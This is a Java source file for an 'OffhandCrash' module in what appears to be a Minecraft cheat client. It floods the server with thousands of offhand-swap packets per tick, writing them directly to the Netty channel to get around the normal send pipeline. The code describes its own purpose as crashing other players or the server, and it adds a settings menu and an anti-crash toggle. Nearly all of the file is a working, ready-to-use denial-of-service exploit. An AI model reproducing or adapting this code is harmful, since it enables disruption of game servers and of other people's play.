package com.tricrotism.modules.crash;

import com.tricrotism.SageFang;
import com.tricrotism.api.eventbus.EventHandler;
import com.tricrotism.api.modules.Category;
import com.tricrotism.api.modules.Module;
import com.tricrotism.api.settings.Settings;
import com.tricrotism.events.game.GameQuitEvent;
import com.tricrotism.events.world.TickEvent;
import com.tricrotism.mixin.accessors.ConnectionAccessor;
import imgui.ImGui;
import imgui.ImGuiIO;
import imgui.flag.ImGuiWindowFlags;
import io.netty.channel.Channel;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;
import net.minecraft.core.Direction;
import net.minecraft.network.Connection;
import net.minecraft.network.protocol.game.ServerboundPlayerActionPacket;

/**
 * Offhand crash exploit. Floods the server with offhand swap packets
 * written directly to the Netty channel, bypassing the normal send pipeline.
 * <p>
 * Can also act as anti-crash by suppressing incoming swap sounds/animations
 * when another player attempts the same exploit on you.
 */
public class OffhandCrash extends Module {

    public static final OffhandCrash instance = new OffhandCrash();

    private final Settings.Bool doCrash =
        bool("Send Packets", "doCrash", "Send offhand swap packets each tick", true);
    private final Settings.Int speed =
        integer("Packets/tick", "speed", "Offhand swaps per tick", 2000, 1, 10000);
    private final Settings.Bool antiCrash =
        bool("Anti-Crash", "antiCrash", "Suppress incoming offhand swap effects", true);

    private static final ServerboundPlayerActionPacket SWAP_PACKET = new ServerboundPlayerActionPacket(
        ServerboundPlayerActionPacket.Action.SWAP_ITEM_WITH_OFFHAND,
        BlockPos.ZERO,
        Direction.UP
    );

    public OffhandCrash() {
        super("offhandcrash", "Offhand Crash", "Flood offhand swap packets to crash other players or the server.", Category.COMBAT);
    }

    /**
     * Returns true if this module is active and anti-crash is enabled.
     * Other mixins can check this to suppress incoming offhand swap effects.
     */
    public boolean isAntiCrash() {
        return isActive() && antiCrash.get();
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!isActive() || !doCrash.get()) return;

        Minecraft mc = Minecraft.getInstance();
        if (mc.player == null || mc.getConnection() == null) return;

        Connection connection = mc.getConnection().getConnection();
        Channel channel = ((ConnectionAccessor) connection).sagefang$getChannel();
        if (channel == null || !channel.isOpen()) return;

        int count = speed.get();
        for (int i = 0; i < count; i++) {
            channel.write(SWAP_PACKET);
        }
        channel.flush();
    }

    @EventHandler
    private void onGameLeft(GameQuitEvent event) {
        if (isActive()) {
            toggle();
        }
    }

    @Override
    public void frame(ImGuiIO io) {
        try {
            if (!isVisible()) return;

            int flags = ImGuiWindowFlags.AlwaysAutoResize;
            ImGui.setNextWindowBgAlpha(0.45f);
            ImGui.begin(title, flags);

            if (ImGui.checkbox("Enabled##ohcEnabled", isActive())) {
                toggle();
            }
            ImGui.separator();

            boolean crash = doCrash.get();
            if (ImGui.checkbox("Send Packets##ohcDoCrash", crash)) {
                doCrash.set(!crash);
            }
            if (ImGui.isItemHovered()) {
                ImGui.setTooltip("Send offhand swap packets each tick");
            }

            if (crash) {
                int[] speedArr = {speed.get()};
                if (ImGui.sliderInt("Packets/tick##ohcSpeed", speedArr, 1, 10000)) {
                    speed.set(speedArr[0]);
                }
            }

            ImGui.separator();

            boolean anti = antiCrash.get();
            if (ImGui.checkbox("Anti-Crash##ohcAnti", anti)) {
                antiCrash.set(!anti);
            }
            if (ImGui.isItemHovered()) {
                ImGui.setTooltip("Suppress incoming offhand swap effects to prevent being crashed");
            }

            ImGui.end();
        } catch (Exception e) {
            SageFang.LOGGER.error("Error in OffhandCrash menu", e);
        }
    }
}
